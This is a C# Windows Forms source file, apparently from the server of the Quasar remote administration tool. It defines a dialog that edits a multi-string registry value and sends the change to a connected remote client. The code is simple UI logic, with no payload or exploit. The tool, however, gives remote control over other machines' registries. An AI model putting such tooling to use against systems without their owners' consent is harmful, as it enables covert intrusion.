using System;
using System.Windows.Forms;
using Quasar.Common.Messages;
using Quasar.Common.Models;
using xServer.Core.Networking;

namespace xServer.Forms
{
    public partial class FrmRegValueEditMultiString : Form
    {
        private readonly Client _connectClient;

        private readonly RegValueData _value;

        private readonly string _keyPath;

        public FrmRegValueEditMultiString(string keyPath, RegValueData value, Client c)
        {
            _connectClient = c;
            _keyPath = keyPath;
            _value = value;

            InitializeComponent();

            this.valueNameTxtBox.Text = value.Name;
            this.valueDataTxtBox.Text = string.Join("\r\n",((string[])value.Data));
        }

        private void okButton_Click(object sender, EventArgs e)
        {
            string[] valueData =
                valueDataTxtBox.Text.Split(new string[] {"\r\n"}, StringSplitOptions.RemoveEmptyEntries);

            _connectClient.Send(new DoChangeRegistryValue
            {
                KeyPath = _keyPath,
                Value = new RegValueData
                {
                    Name = _value.Name,
                    Kind = _value.Kind,
                    Data = valueData
                }
            });
        }
    }
}
